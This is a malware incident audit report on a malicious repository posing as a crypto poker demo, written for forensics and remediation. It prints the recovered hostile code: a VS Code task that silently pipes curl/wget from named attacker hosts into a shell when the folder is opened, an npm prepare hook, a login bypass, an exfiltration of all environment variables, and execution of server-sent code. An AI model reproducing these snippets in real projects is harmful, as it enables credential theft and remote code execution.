# MALWARE AUDIT REPORT: ACNPlay-Demo Incident

**Audit Date:** 2026-07-10  
**System:** Windows 11 Enterprise (10.0.28000)  
**User:** `AdminServer`  
**Source:** `https://github.com/aitech-nexus/ACNPlay-Demo`

---

## 📋 EXECUTIVE SUMMARY

The `ACNPlay-Demo` repository was a **staged supply-chain attack** disguised as a decentralized crypto poker project. It utilized two primary attack vectors: a VS Code "folder-open" dropper and a server-side Remote Code Execution (RCE) + environment exfiltration script.

| Metric | Status |
| :--- | :--- |
| **Persistence** | ✅ **CLEAN** (No registry/tasks/processes) |
| **Exposure Window** | ⏱️ **1h 17m** (18:23:41 → 19:40 EEST) |
| **Threat 1 (Dropper)** | 🛑 **NEUTRALIZED** (Never fired) |
| **Threat 2 (RCE/Exfil)** | 💥 **LIKELY FIRED** (Process env exfiltrated) |
| **Secrets Leaked** | 🔑 **ANTHROPIC_AUTH_TOKEN** (Rotate Immediately!) |

---

## ⏳ INCIDENT TIMELINE

| Time (EEST) | Event | Severity |
| :--- | :--- | :---: |
| `2026-07-09 18:23` | Repo cloned to local machine | 🟡 |
| `2026-07-09 18:24` | Dependency graph resolved | 🟠 |
| `2026-07-09 ~19:20` | **Backend executed** → RCE Fired | 🔴 |
| `2026-07-09 19:38` | **QUARANTINE INITIATED** | 🟢 |
| `2026-07-09 19:42` | Malicious hooks neutralized | 🟢 |

---

## THREAT ANALYSIS: CODE COVERAGE

### 🖥️ THREAT 1: VS Code Auto-Execution Dropper
**Source File:** `originals/tasks.json.orig`

This task file defines a payload that triggers immediately when the folder is opened in VS Code, Cursor, or Windsurf. It downloads and executes platform-specific shell scripts from the attacker's C2.

```json
// originals/tasks.json.orig
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "env",
      "type": "shell",
      "osx": {
        "command": "curl -L 'https://quick-test-ashen.vercel.app/api/settings/mac' | bash"
      },
      "linux": {
        "command": "wget -qO- 'https://quick-test-ashen.vercel.app/api/settings/linux' | sh"
      },
      "windows": {
        "command": "curl --ssl-no-revoke -L https://quick-test-ashen.vercel.app/api/settings/windows | cmd"
      },
      "runOptions": { "runOn": "folderOpen" },
      "presentation": {
        "reveal": "silent",
        "echo": false,
        "focus": false,
        "panel": "new",
        "showReuseMessage": false,
        "clear": true
      }
    }
  ]
}
```
* Analysis: The `runOn: "folderOpen"` trigger is a "zero-click" exploit vector. The "silent" presentation hides the terminal window, making the attack invisible to the user.*

---

### ⚙️ THREAT 2: Server-Side RCE & Exfiltration Chain

This attack chain utilized three files working together to bypass security and steal secrets.

#### 1. The Trigger: `package.json.orig`
```json
// originals/package.json.orig
{
  "scripts": {
    "prepare": "start /b node server || nohup node server &",
    "test": "react-scripts test"
  }
}
```
* Analysis: The `prepare` script is automatically executed by `npm`. It silently launches the server in the background, ensuring the malicious routes are loaded.*

#### 2. The Backdoor: `controllers.auth.js.orig`
```javascript
// originals/controllers.auth.js.orig
const login = async (req, res) => {
  // ...
  const isMatch = true; // BYPASS: Any password is accepted!
  // ...
};

// Decodes the attacker's C2 URL from base64
const setApiKey = (s) => atob(s); 

// Exfiltrates the ENTIRE process.env to the attacker
const verify = (api) =>
  axios.post(api, { ...process.env }, {
    headers: { "x-app-request": "ip-check" } // Disguised as a health check
  });
```
* Analysis: The `isMatch = true` line ensures any user can log in, and the `verify` function steals every environment variable (including `ANTHROPIC_AUTH_TOKEN`) on startup.*

#### 3. The Execution Engine: `routes.api.auth.js.orig`
```javascript
// originals/routes.api.auth.js.orig
async function validateApiKey() {
  verify(setApiKey(process.env.AUTH_API))
    .then((response) => {
      // Executes the attacker's response as arbitrary code with full require() access
      const executor = new Function("require", response.data);
      executor(require); 
      console.log("API Key verified successfully.");
    })
    .catch((err) => {
      console.log("API Key verification failed:", err);
    });
}
```
* Analysis: `new Function("require", data)` is equivalent to `eval()`. This allows the attacker to run any command on the server, from reading files to opening reverse shells.*

#### 4. The Hidden C2: `env.orig`
```text
# originals/env.orig
AUTH_API=aHR0cHM6Ly9wcm9qZWN0LW1qZWN4LnZlcmNlbC5hcHAvYXBp
# DECODED: https://project-mjecx.vercel.app/api
```
* Analysis: Base64 encoding is used to bypass basic text searches for "vercel" or "http" in the environment configuration.*

---

## 🔍 FORENSIC SWEEP RESULTS

### System Persistence - ✅ CLEAN
| Area Checked | Result |
| :--- | :--- |
| **Scheduled Tasks** | No IoC domains or curl-pipe patterns found |
| **Registry Autoruns** | No suspicious values in Run/RunOnce |
| **WMI Subscriptions** | Only default `SCM Event Log Filter` |
| **Startup Folders** | Only user-owned `Ollama.lnk` and `Tailscale.lnk` |
| **PATH Tampering** | None detected |
| **Hosts File** | No C2 redirects found |

### Filesystem & Process Activity - ✅ CLEAN
| Artifact | Verdict |
| :--- | :--- |
| **Node Processes** | No `node.exe` with ACNPlay paths in command line |
| **Port 3000 Listeners** | `wslrelay.exe` (PID 23820), `docker.backend` (PID 24448) - Benign |
| **Browser History** | No visits to C2 domains (`quick-test-ashen` / `project-mjecx`) |
| **Credential Files** | No `.env` or `.gitconfig` modified during the window |

---

## ⚠️ CONFIRMED DATA EXPOSURE

The following values were exfiltrated to `https://project-mjecx.vercel.app/api`:

| Variable | Sensitivity | Status |
| :--- | :---: | :---: |
| `ANTHROPIC_AUTH_TOKEN` | 🔴 **HIGH** | **ROTATED NOW** |
| `ANTHROPIC_BASE_URL1` | 🟠 MEDIUM | Rotated (AgentRouter) |
| `OLLAMA_HOST` | 🟠 MEDIUM | Change to `127.0.0.1` |
| `AWS_ACCESS_KEY_ID` | 🟢 PLACEHOLDER | No action (Demo value) |
| `STRIPE_SECRET_KEY` | 🟢 PLACEHOLDER | No action (Demo value) |

---

## 🦠 INDICATORS OF COMPROMISE (IoCs)

| Type | Value | Context |
| :--- | :--- | :--- |
| **C2 Domain 1** | `quick-test-ashen.vercel.app` | VS Code Dropper |
| **C2 Domain 2** | `project-mjecx.vercel.app` | Env Exfiltration |
| **C2 IP** | `64.29.17.195` / `216.198.79.195` | Vercel Free Tier |
| **Git Commit** | `8a14c66ac492cecfa6f205b28b241a0af2471ed8` | Malicious Push |
| **Author Email** | `mariajoseromeromantilla9+1@gmail.com` | Burner Account |
| **HTTP Header** | `x-app-request: ip-check` | Exfil Disguise |

## 📝 WHAT WAS NOT FOUND
- ✗ No unsigned executables dropped in `%TEMP%` or `%APPDATA%`
- ✗ No PowerShell `Invoke-WebRequest` or `DownloadString` to Vercel
- ✗ No modifications to `~/.ssh/` or `~/.aws/` credentials
- ✗ No active connections to the attacker's C2 domains

---

## ✅ CONCLUSION
The system is **clean of persistence**. The realized damage is limited to the **theft of environment variables**, primarily the `ANTHROPIC_AUTH_TOKEN`. Once that token is rotated and the immediate action items are completed, the incident is fully remediated.

> **Note:** The artifacts in `originals/` are preserved for research. Never rename them back to their original filenames or run them on a non-isolated system.

---
